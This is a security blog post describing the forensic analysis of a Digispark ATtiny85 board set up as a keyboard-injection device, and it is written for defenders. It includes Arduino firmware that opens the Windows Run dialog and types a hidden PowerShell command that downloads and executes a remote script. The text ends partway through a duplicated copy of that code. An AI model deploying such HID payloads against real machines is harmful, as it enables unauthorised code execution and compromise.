---
title: Keystrokes in Disguise: Forensic Analysis of a Digispark HID Device
url: https://blog.nviso.eu/2026/10/16/keystrokes-in-disguise-forensic-analysis-of-a-digispark-hid-device/
source: NVISO Labs
date: 2026-10-16
fetch_date: 2026-10-17T06:35:45.753479
---

# Keystrokes in Disguise: Forensic Analysis of a Digispark HID Device

[Skip to content](#content)

[![NVISO Labs](https://blog.nviso.eu/wp-content/uploads/2022/12/cropped-abn-zcrj_400x400-1.png)](https://blog.nviso.eu/)

[NVISO Labs](https://blog.nviso.eu/)

Cyber security research, straight from the lab! 🐀

* [linkedin](https://www.linkedin.com/company/nviso-cyber)
* mail us
* [our company](https://www.nviso.eu)
* [SSO](https://blog.nviso.eu/wp-admin/edit.php)
* Search for:Search Button

Menu

* [All](https://blog.nviso.eu/)
* [Prevent](https://blog.nviso.eu/category/prevent/)
  + [Application Security](https://blog.nviso.eu/category/prevent/application-security/)
    - [IoT Security](https://blog.nviso.eu/category/prevent/iot-security/)
    - [Web Security](https://blog.nviso.eu/category/prevent/web-security/)
    - [Mobile Security](https://blog.nviso.eu/category/prevent/mobile-security/)
    - [Industrial Security](https://blog.nviso.eu/category/prevent/industrial-security/)
    - [AI Security](https://blog.nviso.eu/category/prevent/application-security/ai-security/)
  + [Cloud Security](https://blog.nviso.eu/category/prevent/cloud-security/)
    - [AWS](https://blog.nviso.eu/category/prevent/cloud-security/aws/)
    - [Azure](https://blog.nviso.eu/category/prevent/cloud-security/azure/)
    - [GCP](https://blog.nviso.eu/category/prevent/cloud-security/gcp/)
    - [Microsoft 365](https://blog.nviso.eu/category/prevent/cloud-security/microsoft-365/)
  + [Awareness](https://blog.nviso.eu/category/prevent/awareness/)
  + [Cyber Strategy](https://blog.nviso.eu/category/prevent/cyber-strategy/)
  + [Red Team](https://blog.nviso.eu/category/prevent/red-team/)
* [Detect](https://blog.nviso.eu/category/detect/)
  + [Blue Team](https://blog.nviso.eu/category/detect/blue-team/)
  + [Purple Team](https://blog.nviso.eu/category/detect/purple-team/)
* [Respond](https://blog.nviso.eu/category/respond/)
  + [Forensics](https://blog.nviso.eu/category/respond/forensics/)
* Other
  + [Events](https://blog.nviso.eu/category/events/)

# Keystrokes in Disguise: Forensic Analysis of a Digispark HID Device

[Kilian Neumair](https://blog.nviso.eu/author/kilian-neumair/)

[Cyber Threats](https://blog.nviso.eu/category/cyber-threats/), [Forensics](https://blog.nviso.eu/category/respond/forensics/), [Incident Response](https://blog.nviso.eu/category/incident-response/)

October 16, 2026October 16, 2026
17 Minutes

By

[Kilian Neumair](https://blog.nviso.eu/author/kilian-neumair/) , [Louis Flamion](https://blog.nviso.eu/author/louis-flamion/)

October 16, 2026

![German flag](https://blog.nviso.eu/wp-content/uploads/2026/08/image-16.png)

Dieser Blogbeitrag ist auch in
Deutsch verfügbar.

During one of our recent incident investigations, we encountered a small and inexpensive USB device: the [Digispark Rev.3](https://www.az-delivery.de/en/products/digispark-board), built around the ATtiny85 microcontroller. Despite its size and low cost, this device is surprisingly capable. It is widely available online and typically costs only a few euros.

![](https://blog.nviso.eu/wp-content/uploads/2026/07/Digispark-1-1024x730.jpg)

Digispark Rev.3

At first glance, the Digispark appears to be a harmless development board. In practice, however, it can be programmed for a wide range of purposes. In our case, it was configured to identify itself as a USB keyboard and automatically send keystrokes to a target system when plugged in. Essentially, it behaved like a USB [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky).

A USB Rubber Ducky is a well-known attack tool that masquerades as a trusted keyboard and delivers predefined keystrokes to a system. Devices such as USB Rubber Duckies and Digisparks are often used for one-time attacks. Once plugged in, they can execute malicious actions within seconds and be removed again before raising suspicion. Depending on the payload, these actions may include executing commands, downloading additional malware, or opening applications and websites.

However, their use is not limited to short-term attacks. They can also remain connected for extended periods to simulate user activity, prevent the screen from locking (similar to a [mouse jiggler](https://en.wikipedia.org/wiki/Mouse_jiggler)) or create the impression that someone is actively using the system. They can also be misused for less severe but disruptive purposes, such as entering random text, triggering unwanted key combinations, opening windows, or changing settings.

The key difference between a USB Rubber Ducky and a Digispark is where the payload is stored. On a USB Rubber Ducky, it is located on removable storage, such as an SD card. On a Digispark, however, the logic is stored directly on the ATtiny85 microcontroller. From a forensic perspective, this makes analysis more difficult, as there is no easily accessible script file to review. Instead, the code must be extracted directly from the device. Incident responders may therefore need both hardware analysis and host-based artefacts to fully understand the incident.

Without proper preparation, this can be risky. Evidence could be accidentally altered or deleted, or the board itself could be damaged. Before analysing the actual device, we therefore bought a Digispark to test the process and develop a safe analysis method.

**In this article, we demonstrate the entire process, from setting up and programming a Digispark as a test device, to testing its behaviour when connected to a system, and finally reading out and analysing the firmware using a cost-effective setup.**

**Disclaimer**
This article is intended for education, research, and authorized security testing only. BadUSB and HID (**Human Interface Device like any computer peripheral like a keyboard or mouse**) injection techniques can be abused, so do not use them on systems that you do not own or that you are not explicitly authorized to test.

# Setting up the Digispark

To identify a suitable analysis method, we first need to configure our test device.

## Programming the device

**Requirements:**
• [Digispark drivers](https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip)
• [Arduino IDE](https://arduino-ide.org/download.html)
• [Additional Board Manager URL (drazzy)](https://drazzy.com/package_drazzy.com_index.json)
• [Additional Board Manager URL (Digistump)](https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json)
• Board Manager: Digistump AVR Boards
• Board: Digispark (Default – 16.5 MHz)

Since the Digispark emulates a keyboard, the firmware is configured to send predefined keystrokes or launch commands automatically when the device is inserted.

For demonstration purposes, we use only harmless payloads. These include actions an attacker might typically perform, such as downloading and executing additional payloads from the internet, as well as opening a specific website to illustrate the concept.

C

```
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Execute the run prompt - Win+R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Open a benign website
  DigiKeyboard.print("msedge nviso.eu");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Give browser time to launch
  DigiKeyboard.delay(5000);

  // Execute the run prompt - Win+R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Execute malicious code
  DigiKeyboard.print("powershell -w hidden -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString(\'https://nviso.eu/script.ps1')\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
```

```
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Execute the run prompt - Win+R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Open a benign website
  DigiKeyboard.print("msedge nviso.eu");
  DigiKeyboard.sendKeyStroke(K...